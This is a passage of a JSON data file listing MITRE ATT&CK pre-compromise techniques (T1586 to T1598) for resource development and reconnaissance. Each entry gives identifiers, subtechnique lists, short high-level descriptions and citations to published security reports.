        "description": "Ryan, T. (2010). “Getting In Bed with Robin Sage.”. Retrieved March 6, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Mandiant APT1",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf",
        "description": "Mandiant. (n.d.). APT1 Exposing One of China’s Cyber Espionage Units. Retrieved July 18, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--81033c3b-16a4-46e4-8fed-9b030dd03c4a",
    "platform": "pre",
    "tid": "T1586",
    "technique": "Compromise Accounts",
    "tactic": "resource-development",
    "datasources": "social-media-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1586.001",
      "T1586.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. <a href=\"https://attack.mitre.org/techniques/T1585\">Establish Accounts</a>), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. <!-- raw HTML omitted --><!-- raw HTML omitted -->A variety of methods exist for compromising accounts, such as gathering credentials via <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>, purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.<!-- raw HTML omitted --><!-- raw HTML omitted -->Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may directly leverage compromised email accounts for <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a> or <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a>.</p>\n",
    "technique_references": [
      {
        "source_name": "AnonHBGary",
        "url": "https://arstechnica.com/tech-policy/2011/02/anonymous-speaks-the-inside-story-of-the-hbgary-hack/",
        "description": "Bright, P. (2011, February 15). Anonymous speaks: the inside story of the HBGary hack. Retrieved March 9, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--edadea33-549c-4ed1-9783-8f5a5853cbdf",
    "platform": "pre",
    "tid": "T1587",
    "technique": "Develop Capabilities",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1587.001",
      "T1587.002",
      "T1587.003",
      "T1587.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020)<!-- raw HTML omitted --><!-- raw HTML omitted -->As with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary’s development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.</p>\n",
    "technique_references": [
      {
        "source_name": "Mandiant APT1",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf",
        "description": "Mandiant. (n.d.). APT1 Exposing One of China’s Cyber Espionage Units. Retrieved July 18, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Kaspersky Sofacy",
        "url": "https://securelist.com/sofacy-apt-hits-high-profile-targets-with-updated-toolset/72924/",
        "description": "Kaspersky Lab's Global Research and Analysis Team. (2015, December 4). Sofacy APT hits high profile targets with updated toolset. Retrieved December 10, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "Bitdefender StrongPity June 2020",
        "url": "https://www.bitdefender.com/files/News/CaseStudies/study/353/Bitdefender-Whitepaper-StrongPity-APT.pdf",
        "description": "Tudorica, R. et al. (2020, June 30). StrongPity APT - Revealing Trojanized Tools, Working Hours and Infrastructure. Retrieved July 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Talos Promethium June 2020",
        "url": "https://blog.talosintelligence.com/2020/06/promethium-extends-with-strongpity3.html",
        "description": "Mercer, W. et al. (2020, June 29). PROMETHIUM extends global reach with StrongPity3 APT. Retrieved July 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ce0687a0-e692-4b77-964a-0784a8e54ff1",
    "platform": "pre",
    "tid": "T1588",
    "technique": "Obtain Capabilities",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1588.001",
      "T1588.002",
      "T1588.003",
      "T1588.004",
      "T1588.005",
      "T1588.006"
    ],
    "count_subtechniques": 6,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.<!-- raw HTML omitted --><!-- raw HTML omitted -->In addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.(Citation: NationsBuying)(Citation: PegasusCitizenLab)<!-- raw HTML omitted --><!-- raw HTML omitted -->In addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.(Citation: DiginotarCompromise)</p>\n",
    "technique_references": [
      {
        "source_name": "NationsBuying",
        "url": "https://www.nytimes.com/2013/07/14/world/europe/nations-buying-as-hackers-sell-computer-flaws.html",
        "description": "Nicole Perlroth and David E. Sanger. (2013, July 12). Nations Buying as Hackers Sell Flaws in Computer Code. Retrieved March 9, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "PegasusCitizenLab",
        "url": "https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/",
        "description": "Bill Marczak and John Scott-Railton. (2016, August 24). The Million Dollar Dissident: NSO Group’s iPhone Zero-Days used against a UAE Human Rights Defender. Retrieved December 12, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "DiginotarCompromise",
        "url": "https://threatpost.com/final-report-diginotar-hack-shows-total-compromise-ca-servers-103112/77170/",
        "description": "Fisher, D. (2012, October 31). Final Report on DigiNotar Hack Shows Total Compromise of CA Servers. Retrieved March 6, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--5282dd9a-d26d-4e16-88b7-7c0f4553daf4",
    "platform": "pre",
    "tid": "T1589",
    "technique": "Gather Victim Identity Information",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1589.001",
      "T1589.002",
      "T1589.003"
    ],
    "count_subtechniques": 3,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may gather information about the victim’s identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, etc.) as well as sensitive details such as credentials.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may gather this information in various ways, such as direct elicitation via <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>. Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: <a href=\"https://attack.mitre.org/techniques/T1593/001\">Social Media</a> or <a href=\"https://attack.mitre.org/techniques/T1594\">Search Victim-Owned Websites</a>).(Citation: OPM Leak)(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a> or <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1586\">Compromise Accounts</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a> or <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "OPM Leak",
        "url": "https://www.opm.gov/cybersecurity/cybersecurity-incidents/",
        "description": "Cybersecurity Resource Center. (n.d.). CYBERSECURITY INCIDENTS. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Register Deloitte",
        "url": "https://www.theregister.com/2017/09/26/deloitte_leak_github_and_google/",
        "description": "Thomson, I. (2017, September 26). Deloitte is a sitting duck: Key systems with RDP open, VPN and proxy 'login details leaked'. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Register Uber",
        "url": "https://www.theregister.com/2015/02/28/uber_subpoenas_github_for_hacker_details/",
        "description": "McCarthy, K. (2015, February 28). FORK ME! Uber hauls GitHub into court to find who hacked database of 50,000 drivers. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Detectify Slack Tokens",
        "url": "https://labs.detectify.com/2016/04/28/slack-bot-token-leakage-exposing-business-critical-information/",
        "description": "Detectify. (2016, April 28). Slack bot token leakage exposing business critical information. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Forbes GitHub Creds",
        "url": "https://www.forbes.com/sites/runasandvik/2014/01/14/attackers-scrape-github-for-cloud-service-credentials-hijack-account-to-mine-virtual-currency/#242c479d3196",
        "description": "Sandvik, R. (2014, January 14). Attackers Scrape GitHub For Cloud Service Credentials, Hijack Account To Mine Virtual Currency. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub truffleHog",
        "url": "https://github.com/dxa4481/truffleHog",
        "description": "Dylan Ayrey. (2016, December 31). truffleHog. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Gitrob",
        "url": "https://github.com/michenriksen/gitrob",
        "description": "Michael Henriksen. (2018, June 9). Gitrob: Putting the Open Source in OSINT. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "CNET Leaks",
        "url": "https://www.cnet.com/news/massive-breach-leaks-773-million-emails-21-million-passwords/",
        "description": "Ng, A. (2019, January 17). Massive breach leaks 773 million email addresses, 21 million passwords. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--9d48cab2-7929-4812-ad22-f536665f0109",
    "platform": "pre",
    "tid": "T1590",
    "technique": "Gather Victim Network Information",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1590.001",
      "T1590.002",
      "T1590.003",
      "T1590.004",
      "T1590.005",
      "T1590.006"
    ],
    "count_subtechniques": 6,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may gather information about the victim’s networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may gather this information in various ways, such as direct collection actions via <a href=\"https://attack.mitre.org/techniques/T1595\">Active Scanning</a> or <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>. Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: <a href=\"https://attack.mitre.org/techniques/T1596\">Search Open Technical Databases</a>).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1595\">Active Scanning</a> or <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1583\">Acquire Infrastructure</a> or <a href=\"https://attack.mitre.org/techniques/T1584\">Compromise Infrastructure</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1199\">Trusted Relationship</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "WHOIS",
        "url": "https://www.whois.net/",
        "description": "NTT America. (n.d.). Whois Lookup. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "DNS Dumpster",
        "url": "https://dnsdumpster.com/",
        "description": "Hacker Target. (n.d.). DNS Dumpster. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Circl Passive DNS",
        "url": "https://www.circl.lu/services/passive-dns/",
        "description": "CIRCL Computer Incident Response Center. (n.d.). Passive DNS. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--937e4772-8441-4e4a-8bf0-8d447d667e23",
    "platform": "pre",
    "tid": "T1591",
    "technique": "Gather Victim Org Information",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1591.001",
      "T1591.002",
      "T1591.003",
      "T1591.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may gather information about the victim’s organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may gather this information in various ways, such as direct elicitation via <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>. Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: <a href=\"https://attack.mitre.org/techniques/T1593/001\">Social Media</a> or <a href=\"https://attack.mitre.org/techniques/T1594\">Search Victim-Owned Websites</a>).(Citation: ThreatPost Broadvoice Leak)(Citation: DOB Business Lookup) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a> or <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1585\">Establish Accounts</a> or <a href=\"https://attack.mitre.org/techniques/T1586\">Compromise Accounts</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a> or <a href=\"https://attack.mitre.org/techniques/T1199\">Trusted Relationship</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "ThreatPost Broadvoice Leak",
        "url": "https://threatpost.com/broadvoice-leaks-350m-records-voicemail-transcripts/160158/",
        "description": "Seals, T. (2020, October 15). Broadvoice Leak Exposes 350M Records, Personal Voicemail Transcripts. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "DOB Business Lookup",
        "url": "https://www.dobsearch.com/business-lookup/",
        "description": "Concert Technologies . (n.d.). Business Lookup - Company Name Search. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--09312b1a-c3c6-4b45-9844-3ccc78e5d82f",
    "platform": "pre",
    "tid": "T1592",
    "technique": "Gather Victim Host Information",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1592.001",
      "T1592.002",
      "T1592.003",
      "T1592.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may gather information about the victim’s hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may gather this information in various ways, such as direct collection actions via <a href=\"https://attack.mitre.org/techniques/T1595\">Active Scanning</a> or <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: <a href=\"https://attack.mitre.org/techniques/T1593/001\">Social Media</a> or <a href=\"https://attack.mitre.org/techniques/T1594\">Search Victim-Owned Websites</a>). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a> or <a href=\"https://attack.mitre.org/techniques/T1596\">Search Open Technical Databases</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1587\">Develop Capabilities</a> or <a href=\"https://attack.mitre.org/techniques/T1588\">Obtain Capabilities</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1195\">Supply Chain Compromise</a> or <a href=\"https://attack.mitre.org/techniques/T1133\">External Remote Services</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "ATT ScanBox",
        "url": "https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks",
        "description": "Blasco, J. (2014, August 28). Scanbox: A Reconnaissance Framework Used with Watering Hole Attacks. Retrieved October 19, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--a0e6614a-7740-4b24-bd65-f1bde09fc365",
    "platform": "pre",
    "tid": "T1593",
    "technique": "Search Open Websites/Domains",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1593.001",
      "T1593.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.(Citation: Cyware Social Media)(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a> or <a href=\"https://attack.mitre.org/techniques/T1596\">Search Open Technical Databases</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1585\">Establish Accounts</a> or <a href=\"https://attack.mitre.org/techniques/T1586\">Compromise Accounts</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1133\">External Remote Services</a> or <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "Cyware Social Media",
        "url": "https://cyware.com/news/how-hackers-exploit-social-media-to-break-into-your-company-88e8da8e",
        "description": "Cyware Hacker News. (2019, October 2). How Hackers Exploit Social Media To Break Into Your Company. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "SecurityTrails Google Hacking",
        "url": "https://securitytrails.com/blog/google-hacking-techniques",
        "description": "Borges, E. (2019, March 5). Exploring Google Hacking Techniques. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "ExploitDB GoogleHacking",
        "url": "https://www.exploit-db.com/google-hacking-database",
        "description": "Offensive Security. (n.d.). Google Hacking Database. Retrieved October 23, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--16cdd21f-da65-4e4f-bc04-dd7d198c7b26",
    "platform": "pre",
    "tid": "T1594",
    "technique": "Search Victim-Owned Websites",
    "tactic": "reconnaissance",
    "datasources": "web-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: <a href=\"https://attack.mitre.org/techniques/T1589/002\">Email Addresses</a>). These sites may also have details highlighting business operations and relationships.(Citation: Comparitech Leak)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a> or <a href=\"https://attack.mitre.org/techniques/T1596\">Search Open Technical Databases</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1585\">Establish Accounts</a> or <a href=\"https://attack.mitre.org/techniques/T1586\">Compromise Accounts</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1199\">Trusted Relationship</a> or <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "Comparitech Leak",
        "url": "https://www.comparitech.com/blog/vpn-privacy/350-million-customer-records-exposed-online/",
        "description": "Bischoff, P. (2020, October 15). Broadvoice database of more than 350 million customer records exposed online. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--67073dde-d720-45ae-83da-b12d5e73ca3b",
    "platform": "pre",
    "tid": "T1595",
    "technique": "Active Scanning",
    "tactic": "reconnaissance",
    "datasources": "network-device-logs|packet-capture",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1595.001",
      "T1595.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP.(Citation: Botnet Scan)(Citation: OWASP Fingerprinting) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a> or <a href=\"https://attack.mitre.org/techniques/T1596\">Search Open Technical Databases</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1587\">Develop Capabilities</a> or <a href=\"https://attack.mitre.org/techniques/T1588\">Obtain Capabilities</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1133\">External Remote Services</a> or <a href=\"https://attack.mitre.org/techniques/T1190\">Exploit Public-Facing Application</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "Botnet Scan",
        "url": "https://www.caida.org/publications/papers/2012/analysis_slash_zero/analysis_slash_zero.pdf",
        "description": "Dainotti, A. et al. (2012). Analysis of a “/0” Stealth Scan from a Botnet. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "OWASP Fingerprinting",
        "url": "https://wiki.owasp.org/index.php/OAT-004_Fingerprinting",
        "description": "OWASP Wiki. (2018, February 16). OAT-004 Fingerprinting. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--55fc4df0-b42c-479a-b860-7a6761bcaad0",
    "platform": "pre",
    "tid": "T1596",
    "technique": "Search Open Technical Databases",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1596.001",
      "T1596.002",
      "T1596.003",
      "T1596.004",
      "T1596.005"
    ],
    "count_subtechniques": 5,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS)(Citation: Medium SSL Cert)(Citation: SSLShopper Lookup)(Citation: DigitalShadows CDN)(Citation: Shodan)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a> or <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1583\">Acquire Infrastructure</a> or <a href=\"https://attack.mitre.org/techniques/T1584\">Compromise Infrastructure</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1133\">External Remote Services</a> or <a href=\"https://attack.mitre.org/techniques/T1199\">Trusted Relationship</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "WHOIS",
        "url": "https://www.whois.net/",
        "description": "NTT America. (n.d.). Whois Lookup. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "DNS Dumpster",
        "url": "https://dnsdumpster.com/",
        "description": "Hacker Target. (n.d.). DNS Dumpster. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Circl Passive DNS",
        "url": "https://www.circl.lu/services/passive-dns/",
        "description": "CIRCL Computer Incident Response Center. (n.d.). Passive DNS. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Medium SSL Cert",
        "url": "https://medium.com/@menakajain/export-download-ssl-certificate-from-server-site-url-bcfc41ea46a2",
        "description": "Jain, M. (2019, September 16). Export & Download — SSL Certificate from Server (Site URL). Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "SSLShopper Lookup",
        "url": "https://www.sslshopper.com/ssl-checker.html",
        "description": "SSL Shopper. (n.d.). SSL Checker. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "DigitalShadows CDN",
        "url": "https://www.digitalshadows.com/blog-and-research/content-delivery-networks-cdns-can-leave-you-exposed-how-you-might-be-affected-and-what-you-can-do-about-it/",
        "description": "Swisscom & Digital Shadows. (2017, September 6). Content Delivery Networks (CDNs) Can Leave You Exposed – How You Might Be Affected And What You Can Do About It. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Shodan",
        "url": "https://shodan.io",
        "description": "Shodan. (n.d.). Shodan. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--a51eb150-93b1-484b-a503-e51453b127a4",
    "platform": "pre",
    "tid": "T1597",
    "technique": "Search Closed Sources",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1597.001",
      "T1597.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may search and gather information about victims from closed sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data.(Citation: D3Secutrity CTI Feeds) Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.(Citation: ZDNET Selling Data)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a> or <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1587\">Develop Capabilities</a> or <a href=\"https://attack.mitre.org/techniques/T1588\">Obtain Capabilities</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1133\">External Remote Services</a> or <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "D3Secutrity CTI Feeds",
        "url": "https://d3security.com/blog/10-of-the-best-open-source-threat-intelligence-feeds/",
        "description": "Banerd, W. (2019, April 30). 10 of the Best Open Source Threat Intelligence Feeds. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "ZDNET Selling Data",
        "url": "https://www.zdnet.com/article/a-hacker-group-is-selling-more-than-73-million-user-records-on-the-dark-web/",
        "description": "Cimpanu, C. (2020, May 9). A hacker group is selling more than 73 million user records on the dark web. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--cca0ccb6-a068-4574-a722-b1556f86833a",
    "platform": "pre",
    "tid": "T1598",
    "technique": "Phishing for Information",
    "tactic": "reconnaissance",
    "datasources": "email-gateway|mail-server|social-media-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1598.001",
      "T1598.002",
      "T1598.003"
    ],
    "count_subtechniques": 3,
